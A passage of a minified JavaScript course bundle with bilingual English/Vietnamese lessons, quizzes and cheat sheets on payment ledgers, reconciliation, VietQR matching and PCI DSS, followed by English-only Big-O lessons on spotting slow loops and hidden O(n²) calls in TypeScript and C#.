VI: Khách hỏi: "Sao ví tôi còn 420.000?" Thiết kế nào giúp CSKH trả lời được?`,choices:[`A single Balance column on the wallet
VI: Chỉ một cột Balance trên ví`,`A ledger with one row per money movement
VI: Sổ cái, mỗi lần tiền đi/đến là một dòng`,`A daily backup of the Balance column
VI: Bản sao lưu cột Balance mỗi ngày`,`A log file of the pages the user opened
VI: File log các trang người dùng đã mở`],answer:1,why:`Only the ledger keeps every movement. Support can list the entries that add up to 420,000.
VI: Chỉ sổ cái giữ lại mọi lần tiền đi/đến. CSKH có thể liệt kê các bút toán cộng lại thành 420.000.`},{id:"payments.ledger.2",kind:"scenario",difficulty:"medium",prompt:`An entry of -120,000 was posted by mistake. What is the correct fix in a ledger?
VI: Một bút toán -120.000 bị ghi nhầm. Cách sửa đúng trong sổ cái là gì?`,choices:["Delete the wrong entry row","Edit its amount to 0","Add a new +120,000 entry that reverses it","Update the Balance column by hand"],answer:2,why:`A ledger is append-only. A reversing entry fixes the balance and keeps the history of the mistake for auditors.
VI: Sổ cái chỉ được thêm dòng. Bút toán đảo ngược sửa được số dư và vẫn giữ lịch sử sai sót cho kiểm toán.`},{id:"payments.ledger.3",kind:"debug",difficulty:"hard",prompt:`Two withdrawals of 80,000 run at the same time on a balance of 100,000. There is no lock. What can happen?
VI: Hai lệnh rút 80.000 chạy cùng lúc trên số dư 100.000. Không có khóa. Chuyện gì có thể xảy ra?`,code:{lang:"ts",text:`const w = await db.getWallet(id);
if (w.balance < amount) throw new Error('Low');
w.balance -= amount;
await db.saveWallet(w); // UPDATE Balance = ...`},choices:[`Both pass: 160,000 paid out, balance shows 20,000
VI: Cả hai qua: chi 160.000, số dư hiện 20.000`,`The second one always fails with the "Low" error
VI: Lệnh thứ hai luôn bị lỗi "Low"`,`Both pass, and the balance shows -60,000
VI: Cả hai đều qua, và số dư hiện -60.000`,`The database blocks the second one by itself
VI: Database tự chặn lệnh thứ hai`],answer:0,why:`Both read 100,000 and both save 20,000. One update is lost, so money leaves but the balance hides it. Lock the row or use a ledger insert in a transaction.
VI: Cả hai đọc 100.000 và cùng lưu 20.000. Một lần cập nhật bị mất, tiền đã ra mà số dư không thể hiện. Hãy khóa dòng hoặc ghi bút toán trong transaction.`},{id:"payments.ledger.4",kind:"compare",difficulty:"medium",prompt:`A wallet top-up of 50,000. Which is better?
A: the app computes 550,000 and runs \`UPDATE Wallets SET Balance = 550000\`.
B: insert a +50,000 entry, and update the cached balance in the same transaction.
VI: Nạp 50.000 vào ví. Cách nào tốt hơn?
VI: A: app tính ra 550.000 rồi chạy \`UPDATE Wallets SET Balance = 550000\`.
VI: B: thêm bút toán +50.000 và cập nhật số dư lưu sẵn trong cùng transaction.`,choices:["A, because it is one simple statement","B, it keeps history and avoids lost updates","Both are equally safe","A, if it runs inside a transaction"],answer:1,why:`A overwrites the value, so a parallel change can be lost and the reason is gone. B keeps the reason and only adds to the balance.
VI: A ghi đè giá trị, nên thay đổi chạy song song có thể bị mất và không còn lý do. B giữ lại lý do và chỉ cộng thêm vào số dư.`}]},{id:"payments.recon",title:"Reconciliation · Đối soát",summary:`Every day, prove that your records match the bank.
VI: Mỗi ngày, chứng minh số liệu của bạn khớp với ngân hàng.`,minutes:4,blocks:[{type:"text",text:`**Reconciliation** means comparing two lists of money: your records and the bank or gateway **statement**. Every difference must be found and explained.
VI: **Đối soát** là so sánh hai danh sách tiền: số liệu của bạn và **sao kê** của ngân hàng hoặc cổng thanh toán. Mọi chênh lệch phải được tìm ra và giải thích.`},{type:"diagram",text:` Ref      Ours     Gateway  Result
 ───────  ───────  ───────  ───────────
 SO-1001  500,000  500,000  Matched
 SO-1002  200,000  180,000  Amount diff
 SO-1003  300,000  -        Only ours
 SO-1004  -        150,000  Only theirs`},{type:"list",items:[`**Matched**: same reference, same amount. Nothing to do.
VI: **Khớp**: cùng mã, cùng số tiền. Không cần làm gì.`,`**Amount diff**: check fees, partial refunds or a wrong amount.
VI: **Lệch số tiền**: kiểm tra phí, hoàn tiền một phần hoặc sai số tiền.`,`**Only ours**: we think it is paid, but the gateway does not. Goods may ship without money.
VI: **Chỉ bên mình có**: mình nghĩ đã trả, cổng thanh toán thì không. Có thể giao hàng mà chưa có tiền.`,`**Only theirs**: money arrived, but no order is marked paid. Often a lost IPN.
VI: **Chỉ bên kia có**: tiền đã về nhưng không đơn nào được ghi nhận. Thường do mất IPN.`]},{type:"text",text:`Gateways often pay you the amount **minus a fee**. Record the fee as its own entry. For example: 500,000 = 489,000 paid + 11,000 fee.
A **chargeback** is when the card holder disputes a payment with their bank. The money is taken back from the shop, often weeks later.
VI: Cổng thanh toán thường trả cho bạn số tiền **đã trừ phí**. Hãy ghi phí thành bút toán riêng. Ví dụ: 500.000 = 489.000 thực nhận + 11.000 phí.
VI: **Chargeback** (bồi hoàn) là khi chủ thẻ khiếu nại giao dịch với ngân hàng của họ. Tiền bị lấy lại từ cửa hàng, thường sau vài tuần.`},{type:"example",title:"The daily job",text:`At 02:00 a job downloads yesterday's statement file. It matches lines by gateway transaction id. The finance team then reviews only the differences.
VI: Lúc 02:00, một job tải file sao kê ngày hôm qua. Nó khớp từng dòng theo mã giao dịch của cổng. Sau đó kế toán chỉ cần xem các dòng chênh lệch.`},{type:"text",text:"IT side: a `StatementLines` table for imported rows and a `ReconResults` table with a status per line. Ask finance: which difference is small enough to ignore? Who fixes each type, and by when?\nVI: Phía IT: bảng `StatementLines` chứa dòng sao kê đã nhập và bảng `ReconResults` lưu trạng thái từng dòng. Hỏi kế toán: chênh lệch bao nhiêu thì bỏ qua được? Ai xử lý từng loại, hạn khi nào?"}],remember:`Match every line, every day. Each difference gets a reason and an owner.
VI: Khớp từng dòng, mỗi ngày. Mỗi chênh lệch phải có lý do và người chịu trách nhiệm.`,questions:[{id:"payments.recon.1",kind:"debug",difficulty:"easy",prompt:`Recon shows a gateway payment of 150,000 that matches no paid order. What is the most likely cause?
VI: Đối soát thấy một giao dịch 150.000 trên cổng không khớp đơn nào đã trả. Nguyên nhân hay gặp nhất là gì?`,choices:[`The IPN was lost or failed, so the order stayed unpaid
VI: IPN bị mất hoặc lỗi, nên đơn vẫn chưa trả`,`The gateway made up a payment that never happened
VI: Cổng thanh toán tự bịa ra giao dịch`,`The customer paid for an order from another shop
VI: Khách trả tiền cho đơn của cửa hàng khác`,`The statement file was downloaded twice by mistake
VI: File sao kê bị tải về hai lần`],answer:0,why:`Money arrived, but your system never recorded it. A missing or rejected IPN is the usual reason. Check the IPN logs for that transaction id.
VI: Tiền đã về nhưng hệ thống không ghi nhận. Lý do thường gặp là IPN bị mất hoặc bị từ chối. Hãy xem log IPN theo mã giao dịch đó.`},{id:"payments.recon.2",kind:"scenario",difficulty:"medium",prompt:`Our record: 500,000. The gateway paid us 489,000, and the statement shows a fee of 11,000. Is this a mismatch?
VI: Số liệu của mình: 500.000. Cổng thanh toán trả 489.000, sao kê ghi phí 11.000. Đây có phải chênh lệch không?`,choices:[`Yes, 11,000 is missing, so report a loss
VI: Có, thiếu 11.000, báo cáo mất tiền`,`No, 500,000 = 489,000 paid + 11,000 fee
VI: Không, 500.000 = 489.000 thực nhận + 11.000 phí`,`Yes, so refund the customer 11,000
VI: Có, nên hoàn cho khách 11.000`,`No, because small amounts are always ignored
VI: Không, vì số nhỏ luôn được bỏ qua`],answer:1,why:`The gross amount matches once the fee is counted. Record the fee as its own expense entry, so the books still balance.
VI: Tính cả phí thì tổng tiền vẫn khớp. Hãy ghi phí thành bút toán chi phí riêng để sổ sách vẫn cân.`},{id:"payments.recon.3",kind:"truefalse",difficulty:"medium",prompt:`If a payment matched in yesterday's recon, it can never cause a difference later.
VI: Nếu một giao dịch đã khớp trong đối soát hôm qua thì sau này không thể gây chênh lệch nữa.`,choices:["True","False"],answer:1,why:`Refunds and chargebacks can arrive days or weeks later. Recon runs every day for this reason.
VI: Hoàn tiền và chargeback có thể đến sau vài ngày hoặc vài tuần. Vì vậy đối soát phải chạy mỗi ngày.`},{id:"payments.recon.4",kind:"compare",difficulty:"hard",prompt:`You match statement lines to your payments. Which key is the most reliable?
VI: Khi khớp dòng sao kê với giao dịch của mình, khóa nào đáng tin nhất?`,choices:[`Gateway transaction id saved from the IPN
VI: Mã giao dịch của cổng, lưu từ IPN`,`Amount plus date, with nothing else
VI: Chỉ số tiền cộng ngày`,`Customer name written in the payment
VI: Tên khách ghi trong giao dịch`,`The time the statement file was made
VI: Thời điểm tạo file sao kê`],answer:0,why:`The gateway id is unique and appears on both sides. Many payments share the same amount and date, and names are often typed differently.
VI: Mã giao dịch của cổng là duy nhất và có ở cả hai bên. Nhiều giao dịch trùng số tiền và ngày, còn tên thì hay gõ khác nhau.`}]},{id:"payments.vietnam",title:"QR payments and compliance in Vietnam · Thanh toán QR và tuân thủ tại Việt Nam",summary:`VietQR transfers, matching the content, KYC, AML and PCI DSS.
VI: Chuyển khoản VietQR, khớp nội dung, KYC, AML và PCI DSS.`,minutes:5,blocks:[{type:"text",text:`**Napas 247** is the interbank network for fast transfers, at any hour of any day. **VietQR** is a common QR standard. The customer scans it in a bank app, and the account, amount and content are filled in.
VI: **Napas 247** là mạng chuyển tiền nhanh liên ngân hàng, chạy mọi giờ, mọi ngày. **VietQR** là chuẩn mã QR phổ biến. Khách quét bằng app ngân hàng, số tài khoản, số tiền và nội dung được điền sẵn.`},{type:"diagram",text:` Shop shows a VietQR
 ┌───────────────────────────┐
 │ Account: Bank X 123456789 │
 │ Amount:  350,000 VND      │
 │ Content: DH1001           │
 └─────────────┬─────────────┘
               │ customer scans, pays
               ▼
 Napas 247 ──► shop's bank account
               │ bank API or statement
               ▼
 Shop system: find DH1001 → order 1001`},{type:"text",text:`Matching is the hard part. People delete the code, type it wrong, or add words like "ck dh 1001 anh Nam". Use a short code with no spaces or accents. Search for it inside the text, then check the amount.
VI: Phần khó là khớp nội dung. Khách xóa mã, gõ sai, hoặc thêm chữ như "ck dh 1001 anh Nam". Dùng mã ngắn, không dấu cách, không dấu tiếng Việt. Tìm mã trong nội dung, rồi kiểm tra số tiền.`},{type:"code",code:{lang:"ts",text:`// Find an order code like DH1001 in free text
function findOrderId(content: string) {
  const m = content.match(/DH\\s*-?\\s*(\\d+)/i);
  return m ? Number(m[1]) : null;
}
findOrderId('ck dh 1001 anh Nam'); // 1001
findOrderId('chuyen tien');        // null`}},{type:"list",items:[`No code or unknown code → manual review queue.
VI: Không có mã hoặc mã lạ → đưa vào hàng chờ kiểm tra tay.`,`Right code, wrong amount → do not mark paid; ask finance.
VI: Đúng mã, sai số tiền → không ghi nhận đã trả; hỏi kế toán.`,`Two transfers for one order → one is an overpayment to return.
VI: Hai lần chuyển cho một đơn → một lần là trả thừa, cần hoàn lại.`,`Money after the order expired → reopen the order or refund?
VI: Tiền về sau khi đơn hết hạn → mở lại đơn hay hoàn tiền?`]},{type:"example",title:"A typo that pays the wrong order",text:`The QR asks for 350,000 VND with content DH1001. The customer types DH1010 instead. Order 1010 costs 90,000 VND, so the amount check stops the wrong match.
VI: Mã QR yêu cầu 350.000 VND với nội dung DH1001. Khách lại gõ DH1010. Đơn 1010 chỉ 90.000 VND, nên bước kiểm tra số tiền chặn được việc khớp sai.`},{type:"list",items:[`**KYC** (Know Your Customer): check who the user really is, for example with a citizen ID card (CCCD).
VI: **KYC** (định danh khách hàng): xác minh người dùng thật sự là ai, ví dụ bằng căn cước công dân (CCCD).`,`**AML** (Anti-Money Laundering): watch for suspicious money flows and report them as the law requires.
VI: **AML** (phòng, chống rửa tiền): theo dõi dòng tiền đáng ngờ và báo cáo theo quy định pháp luật.`,`**PCI DSS**: the card industry security standard. Never store the CVV. Avoid storing full card numbers; keep a token.
VI: **PCI DSS**: chuẩn bảo mật của ngành thẻ. Không bao giờ lưu CVV. Tránh lưu số thẻ đầy đủ; hãy lưu token.`]},{type:"diagram",text:` Browser ── card number, CVV ──► Gateway
                                   │
            token + last 4 digits  │
 Your DB ◄─────────────────────────┘
 ┌──────────┬───────┬────────┐
 │ Token    │ Last4 │ Expiry │
 │ tok_8f3a │ 4242  │ 12/28  │
 └──────────┴───────┴────────┘
 No full card number. No CVV.`}],remember:`Short order code in the content, then match code and amount. Store tokens, never CVVs.
VI: Mã đơn ngắn trong nội dung, rồi khớp cả mã lẫn số tiền. Lưu token, không bao giờ lưu CVV.`,questions:[{id:"payments.vietnam.1",kind:"scenario",difficulty:"medium",prompt:`A 350,000 VND transfer arrives with the content "chuyen tien". There is no order code. What should the system do?
VI: Một khoản 350.000 VND về với nội dung "chuyen tien", không có mã đơn. Hệ thống nên làm gì?`,choices:[`Put it in a manual review queue
VI: Đưa vào hàng chờ kiểm tra tay`,`Mark the newest 350,000 order as paid
VI: Ghi nhận đơn 350.000 mới nhất là đã trả`,`Send the money back right away
VI: Chuyển trả tiền ngay lập tức`,`Ignore it, since it is not our money
VI: Bỏ qua, vì không phải tiền của mình`],answer:0,why:`Guessing by amount can mark the wrong order paid. A person should check it, for example by calling the customer.
VI: Đoán theo số tiền có thể ghi nhận nhầm đơn. Cần người kiểm tra, ví dụ gọi cho khách.`},{id:"payments.vietnam.2",kind:"mcq",difficulty:"easy",prompt:`After a card payment, what may a shop keep in its own database?
VI: Sau khi thanh toán thẻ, cửa hàng được lưu gì trong database của mình?`,choices:["The CVV, encrypted","A gateway token and the last 4 digits","The full card number in plain text","The CVV and the card PIN"],answer:1,why:`PCI DSS forbids keeping the CVV after authorization. A token from the gateway lets you charge again without holding card data.
VI: PCI DSS cấm lưu CVV sau khi cấp phép. Token từ cổng thanh toán cho phép thu tiền lại mà không phải giữ dữ liệu thẻ.`},{id:"payments.vietnam.3",kind:"debug",difficulty:"hard",prompt:`Order 1010 (90,000 VND) is marked paid by a 350,000 VND transfer with content "DH1010". Order 1001 (350,000 VND) is still unpaid. What check was missing?
VI: Đơn 1010 (90.000 VND) được ghi nhận đã trả bởi khoản 350.000 VND nội dung "DH1010". Đơn 1001 (350.000 VND) vẫn chưa trả. Thiếu bước kiểm tra nào?`,choices:[`Comparing transfer amount with order amount
VI: So số tiền chuyển với số tiền của đơn`,`Removing accents from the content text
VI: Bỏ dấu tiếng Việt trong nội dung`,`Checking the time zone of the transfer
VI: Kiểm tra múi giờ của giao dịch`,`Checking the customer's KYC level
VI: Kiểm tra mức KYC của khách`],answer:0,why:`The customer swapped two digits. The code matched a real order, but the amount did not. Match on code and amount together.
VI: Khách gõ đảo hai chữ số. Mã khớp với một đơn có thật, nhưng số tiền thì không. Phải khớp cả mã lẫn số tiền.`},{id:"payments.vietnam.4",kind:"compare",difficulty:"easy",prompt:`Which transfer content is easier to match automatically?
VI: Nội dung chuyển khoản nào dễ khớp tự động hơn?`,choices:["DH1001","Đơn hàng #1001 - Nguyễn Văn A","Thanh toan don hang so 1001 cho shop"],answer:0,why:`A short code with no spaces or accents is easy to type and easy to find. Some bank apps may drop accents or special characters from long text.
VI: Mã ngắn, không dấu cách, không dấu dễ gõ và dễ tìm. Một số app ngân hàng có thể bỏ dấu hoặc ký tự đặc biệt trong nội dung dài.`}]}],cheatSheet:[{title:"Money and flow · Tiền và luồng thanh toán",items:[{term:"Minor unit · Đơn vị lẻ",meaning:`Smallest part of a currency, like cents. VND uses none in practice.
VI: Phần nhỏ nhất của đồng tiền, như cent. Thực tế VND không dùng.`},{term:"ISO 4217 · Mã tiền tệ",meaning:`Three-letter currency code like USD or VND. Store it with every amount.
VI: Mã tiền tệ ba chữ như USD, VND. Lưu kèm mỗi số tiền.`},{term:"Allocation · Phân bổ",meaning:`Split so the parts add up exactly; one part takes the remainder.
VI: Chia sao cho các phần cộng lại đúng tổng; một phần nhận số dư.`},{term:"Authorize · Cấp phép",meaning:`Bank checks the card and holds the money.
VI: Ngân hàng kiểm tra thẻ và giữ số tiền.`},{term:"Capture · Thu tiền",meaning:`Shop takes the held money.
VI: Cửa hàng lấy số tiền đang giữ.`},{term:"Settle · Quyết toán",meaning:`Banks really move the money to the shop, often minus fees.
VI: Ngân hàng thật sự chuyển tiền cho cửa hàng, thường đã trừ phí.`},{term:"Void / Refund · Hủy / Hoàn tiền",meaning:`Void cancels before capture. Refund returns money already taken.
VI: Void hủy trước khi thu. Refund trả lại tiền đã thu.`}]},{title:"Gateways and safety · Cổng thanh toán và an toàn",items:[{term:"Return URL",meaning:`Browser redirect after paying. It shows a result but is not proof.
VI: Trình duyệt quay về sau khi trả tiền. Chỉ hiển thị, không phải bằng chứng.`},{term:"IPN / Webhook",meaning:`Server-to-server message from the gateway. Verify its signature.
VI: Thông báo từ máy chủ cổng tới máy chủ mình. Phải kiểm tra chữ ký.`},{term:"Query API · API truy vấn",meaning:`Ask the gateway for the real status when unsure.
VI: Hỏi cổng thanh toán trạng thái thật khi chưa chắc.`},{term:"Idempotency key · Khóa chống lặp",meaning:`One id per payment attempt, the same on every retry.
VI: Một mã cho mỗi lần thanh toán, giữ nguyên khi gửi lại.`},{term:"Unknown · Chưa rõ",meaning:`Status after a timeout: not paid, not failed. Check before acting.
VI: Trạng thái sau timeout: chưa trả, chưa thất bại. Kiểm tra rồi mới xử lý.`}]},{title:"Ledger and recon · Sổ cái và đối soát",items:[{term:"Ledger · Sổ cái",meaning:`Append-only list of money movements. Balance is their sum.
VI: Danh sách tiền đi/đến, chỉ thêm dòng. Số dư là tổng của chúng.`},{term:"Double-entry · Bút toán kép",meaning:`A transfer writes a minus and a plus entry that sum to zero.
VI: Mỗi lần chuyển ghi một bút toán trừ và một bút toán cộng, tổng bằng 0.`},{term:"Reversal · Bút toán đảo",meaning:`Fix a wrong entry by adding its opposite, never by editing.
VI: Sửa bút toán sai bằng cách thêm bút toán ngược, không sửa dòng cũ.`},{term:"Reconciliation · Đối soát",meaning:`Compare your records with the bank or gateway statement.
VI: So số liệu của mình với sao kê ngân hàng hoặc cổng thanh toán.`},{term:"Chargeback · Bồi hoàn",meaning:`Card holder disputes a payment; the shop loses the money later.
VI: Chủ thẻ khiếu nại giao dịch; cửa hàng bị lấy lại tiền sau đó.`}]},{title:"Vietnam and compliance · Việt Nam và tuân thủ",items:[{term:"Napas 247",meaning:`Interbank network for fast transfers at any hour.
VI: Mạng chuyển tiền nhanh liên ngân hàng, chạy mọi giờ.`},{term:"VietQR",meaning:`QR standard that fills in account, amount and transfer content.
VI: Chuẩn QR điền sẵn số tài khoản, số tiền và nội dung chuyển khoản.`},{term:"Transfer content · Nội dung chuyển khoản",meaning:`Holds the order code. Match the code, then check the amount.
VI: Chứa mã đơn. Khớp mã, rồi kiểm tra số tiền.`},{term:"KYC · Định danh khách hàng",meaning:`Verify who the customer really is.
VI: Xác minh khách hàng thật sự là ai.`},{term:"AML · Phòng, chống rửa tiền",meaning:`Watch and report suspicious money flows.
VI: Theo dõi và báo cáo dòng tiền đáng ngờ.`},{term:"PCI DSS",meaning:`Card data security standard. Never store the CVV; use tokens.
VI: Chuẩn bảo mật dữ liệu thẻ. Không lưu CVV; dùng token.`}]}]},ne=Object.freeze(Object.defineProperty({__proto__:null,default:te},Symbol.toStringTag,{value:"Module"})),ae={id:"performance",title:"Big-O & Performance",emoji:"⚡",tagline:"Find the code that gets slow when data grows",lessons:[{id:"performance.growth",title:"Big-O: how work grows",summary:'Not "how fast", but "how much slower with more data".',minutes:4,blocks:[{type:"text",text:`**Big-O** answers one question: "If the data gets 10× bigger, how much more work does my code do?"
It is not about exact milliseconds. It is about the **shape** of the growth.`},{type:"diagram",text:`n = number of items

             n = 10   n = 1,000   n = 1,000,000
O(1)              1           1               1
O(log n)         ~3         ~10             ~20
O(n)             10       1,000       1,000,000
O(n log n)      ~33     ~10,000     ~20,000,000
O(n²)           100   1,000,000            10¹²
                                    (a trillion!)`},{type:"list",items:["**O(1)** — constant. Same work at any size: `dict[key]`, `arr[5]`.","**O(log n)** — halves the problem each step: binary search, a database index. 1 million items → ~20 steps.","**O(n)** — one pass over the data: a simple loop, `.includes`, `List.Contains`.","**O(n log n)** — a good sort: `Array.prototype.sort`, `List<T>.Sort`, LINQ `OrderBy`.","**O(n²)** — a loop inside a loop over the same data. Fine for 100 items, painful for 100,000."]},{type:"example",title:'The "100 items" trap',text:`100 items: O(n) → 100 operations, O(n²) → 10,000. Both feel instant.
100,000 items: O(n) → 100,000, O(n²) → 10 billion. One is still instant. The other freezes your API.
Small test data hides O(n²).`},{type:"text",text:"Big-O drops the small details. O(2n) is still O(n), and O(n² + n) is still O(n²). Only the part that grows fastest matters when n is big."}],remember:"Big-O is not speed. It is how the work grows when the data grows.",questions:[{id:"performance.growth.1",kind:"mcq",difficulty:"medium",prompt:"An O(n²) function takes 1 second for 10,000 items. Roughly how long for 100,000 items?",choices:["~2 seconds","~10 seconds","~100 seconds","~1,000 seconds"],answer:2,why:"10× more data with O(n²) means 10² = 100× more work. 1 second becomes about 100 seconds.",remember:"O(n²): 10× data → 100× time."},{id:"performance.growth.2",kind:"mcq",difficulty:"easy",prompt:"You use binary search on a **sorted** array of 1 billion items. About how many steps does it need?",choices:["~30","~1,000","~1 million","~1 billion"],answer:0,why:"Each step throws away half. 2³⁰ is about 1 billion, so cutting in half ~30 times is enough. That is the power of O(log n)."},{id:"performance.growth.3",kind:"scenario",difficulty:"medium",prompt:"A report works fine with 200 test customers. Production has 400,000 customers (2,000× more). The code compares every customer with every other customer. What should you expect?",choices:["About 2,000× more work, same as the data","The same speed — CPUs are fast enough","About 4 million× more work — likely unusable","A compile error once the data is big"],answer:2,why:"Comparing every item with every other item is O(n²). 2,000× more data → 2,000² = 4,000,000× more work.",remember:"Test with production-sized data before you trust a nested loop."},{id:"performance.growth.4",kind:"truefalse",difficulty:"medium",prompt:"An O(n) algorithm is always faster than an O(n²) algorithm.",choices:["True","False"],answer:1,why:"Big-O ignores the cost of each step. For small n, an O(n²) loop in memory can beat an O(n) loop with a network call per item. Big-O tells you who wins **as n grows**."}]},{id:"performance.reading-code",title:"Find the Big-O in code",summary:"Add loops that follow each other, multiply loops inside each other.",minutes:4,blocks:[{type:"text",text:"You do not need math. Look for **loops**, and look at **what each loop runs over**."},{type:"code",code:{lang:"ts",text:`// O(1): no loop — size of users does not matter
const first = users[0];

// O(n): one loop over the data
for (const u of users) total += u.age;

// Still O(n): two loops one AFTER another → n + n
for (const u of users) countActive(u);
for (const u of users) sendMail(u);

// O(n²): a loop INSIDE a loop over the same data
for (const a of users)
  for (const b of users)
    if (a !== b && a.email === b.email) dupes.push(a);`}},{type:"code",code:{lang:"ts",text:`// O(log n): the search range halves each step
let lo = 0, hi = sorted.length - 1;
while (lo <= hi) {
  const mid = (lo + hi) >> 1;
  if (sorted[mid] === target) return mid;
  if (sorted[mid] < target) lo = mid + 1;
  else hi = mid - 1;
}`}},{type:"list",items:["One loop over n → **O(n)**","Loops one **after** another → add → still O(n)","Loop **inside** a loop → multiply → O(n²), or **O(n × m)** for two different lists","Range cut in half each step → **O(log n)**","Inner loop over a few fixed items (7 weekdays, 3 lines per order) → do not multiply by n"]},{type:"example",title:"Ask the key question",text:'Do not ask "is there a nested loop?". Ask "**what does the inner loop run over?**" The lines of one order? Fine. All orders again? That is O(n²).'}],remember:"After each other → add. Inside each other → multiply.",questions:[{id:"performance.reading-code.1",kind:"code",difficulty:"medium",prompt:"There are n orders, each with about 3 lines. What is the Big-O of this code?",code:{lang:"csharp",text:`foreach (var order in orders)          // n orders
    foreach (var line in order.Lines)  // ~3 lines each
        total += line.Price;`},choices:["O(n²) — every nested loop is O(n²)","O(log n) — the inner loop is short","O(n) — it visits each line once","O(1) — the work per order is small"],answer:2,why:"The inner loop runs over the lines of **one** order, not over all orders. Total work = total number of lines ≈ 3n, which is O(n).",remember:"Nested is not automatically O(n²). Check what the inner loop runs over."},{id:"performance.reading-code.2",kind:"code",difficulty:"medium",prompt:"What is the Big-O here, and is there a faster way?",code:{lang:"ts",text:`function hasDuplicate(ids: number[]): boolean {
  for (let i = 0; i < ids.length; i++)
    for (let j = i + 1; j < ids.length; j++)
      if (ids[i] === ids[j]) return true;
  return false;
}`},choices:["O(n²) — use a Set and check `has` in one loop","O(n) — it is already the best","O(log n) — because `j` starts at `i + 1`","O(n²) — but nothing faster exists"],answer:0,why:"Starting `j` at `i + 1` halves the work, but n²/2 is still O(n²). With a `Set` you check and add each id once: O(n) time, using O(n) extra memory."},{id:"performance.reading-code.3",kind:"code",difficulty:"hard",prompt:"Which loop is O(log n)?",code:{lang:"ts",text:`// A
for (let i = 0; i < n; i += 2) work();
// B
for (let i = 1; i < n; i *= 2) work();
// C
for (let i = 0; i < n; i++)
  for (let j = 0; j < 10; j++) work();`},choices:["A","C","B","All three are O(n)"],answer:2,why:"B doubles `i` each time, so it reaches n after about log₂ n steps. A runs n/2 times and C runs 10n times — both are O(n)."},{id:"performance.reading-code.4",kind:"scenario",difficulty:"hard",prompt:"A sync job matches 50,000 orders against 2,000 warehouses with a nested loop (orders outside, warehouses inside). A PR swaps the loops so warehouses are outside. Does that fix the speed?",choices:["Yes — a small outer loop makes it O(n)","Yes — it halves the total work","No — swapping makes it O(n³)","No — it is still 100 million checks"],answer:3,why:"50,000 × 2,000 = 2,000 × 50,000. Swapping does not change n × m. The real fix: put warehouses in a Dictionary by id, then do 50,000 O(1) lookups.",remember:"n × m = m × n. Replace the inner search, do not reorder it."}]},{id:"performance.hidden-loops",title:"Hidden loops",summary:"The O(n²) that looks like one loop.",minutes:5,blocks:[{type:"text",text:"The most common O(n²) in real code does not look like two loops. The second loop is **hidden inside a method call**."},{type:"list",items:["JS: `includes`, `indexOf`, `find`, `findIndex`, `filter`, `some`, `shift` — all O(n) on an array","C#: `List.Contains`, `List.Find`, `IndexOf`, `Remove(item)`, `Insert(0, x)` — all O(n)","LINQ: `First(pred)`, `Any(pred)`, `Where(...)`, `Count()` on a query — they loop for you"]},{type:"code",code:{lang:"ts",text:`// ❌ O(n × m): includes() scans "banned" for every user
const ok = users.filter(u => !banned.includes(u.id));

// ✅ O(n + m): build a Set once, has() is O(1) average
const bannedSet = new Set(banned);
const ok2 = users.filter(u => !bannedSet.has(u.id));`}},{type:"code",code:{lang:"csharp",text:`// ❌ Find scans the whole customer list for every order
foreach (var o in orders)
    o.Customer = customers.Find(c => c.Id == o.CustomerId);

// ✅ Build a dictionary once (O(n)), then O(1) per lookup
var byId = customers.ToDictionary(c => c.Id);
foreach (var o in orders)
    o.Customer = byId[o.CustomerId];`}},{type:"text",text:"**LINQ `Count()` in a loop condition.** On a `List<T>` it is fast (it reads the `Count` property). On a **query** like `users.Where(...)`, it runs the whole query **every time** the condition is checked."},{type:"code",code:{lang:"csharp",text:`var active = users.Where(u => u.IsActive); // a query, not a list
for (int i = 0; i < active.Count(); i++)   // re-runs Where each time
    Notify(active.ElementAt(i));           // walks from the start again

// ✅ foreach (var u in users.Where(u => u.IsActive)) Notify(u);`}},{type:"text",text:"**String `+=` in a loop (C#).** Strings never change. Each `+=` builds a new string and copies all the old characters. Over many rounds that is O(n²) copying. Use `StringBuilder` or `string.Join`. (Modern JS engines handle `+=` much better, so this is mainly a C# problem.)"},{type:"code",code:{lang:"csharp",text:`// ❌ copies the growing string on every row
string csv = "";
foreach (var row in rows) csv += row.ToCsv() + "\\n";

// ✅ appends into one growing buffer
var sb = new StringBuilder();
foreach (var row in rows) sb.AppendLine(row.ToCsv());`}}],remember:"A search inside a loop is a loop inside a loop. Build a Set or Dictionary once.",questions:[{id:"performance.hidden-loops.1",kind:"perf",difficulty:"medium",prompt:"This line takes several seconds. `orders` has 200,000 items, `vipIds` has 20,000. What is the best fix?",code:{lang:"ts",text:"const vipOrders = orders.filter(o => vipIds.includes(o.customerId));"},choices:["Use a classic `for` loop instead of `filter`","Use `indexOf` instead of `includes`","Turn `vipIds` into a `Set` and use `has()`","Sort `orders` before filtering"],answer:2,why:"`includes` scans up to 20,000 ids for each of 200,000 orders — up to 4 billion checks. With a Set, each check is O(1) on average, so the total is about 220,000 operations.",remember:"`.includes` inside a loop → make a Set first."},{id:"performance.hidden-loops.2",kind:"code",difficulty:"hard",prompt:"`users` is a `List<User>` with 50,000 items. Why is this loop so slow?",code:{lang:"csharp",text:`var active = users.Where(u => u.IsActive);
for (int i = 0; i < active.Count(); i++)
{
    Notify(active.ElementAt(i));
}`},choices:["`Where` copies the whole list on every line","`Count()` and `ElementAt()` re-run the query each time","`for` loops are slower than `foreach` in C#","`Notify` is called twice for each user"],answer:1,why:"`active` is a lazy query, not a list: it runs again each time you read it. Every `Count()` walks all 50,000 users, and every `ElementAt(i)` walks from the start again. That makes the loop O(n²). Use `foreach`, or call `.ToList()` once.",remember:"A LINQ query re-runs every time you touch it."},{id:"performance.hidden-loops.3",kind:"debug",difficulty:"medium",prompt:'A C# CSV export of 100,000 rows takes minutes, and the garbage collector runs all the time. The loop body is `csv += line + "\\n";`. What is the cause?',choices:["Each `+=` copies the whole string built so far","The disk is too slow to write CSV","CSV escaping is expensive for each row","`foreach` creates a new enumerator per row"],answer:0,why:"Strings are immutable: they never change. Row 90,000 copies almost the full file again, and each old copy becomes garbage. `StringBuilder` appends into one buffer instead."},{id:"performance.hidden-loops.4",kind:"compare",difficulty:"medium",prompt:"You must remove 10,000 cancelled orders from a `List<Order>` of 500,000. Which is better?",code:{lang:"csharp",text:`// A
foreach (var c in cancelled) orders.Remove(c);

// B
var ids = cancelled.Select(c => c.Id).ToHashSet();
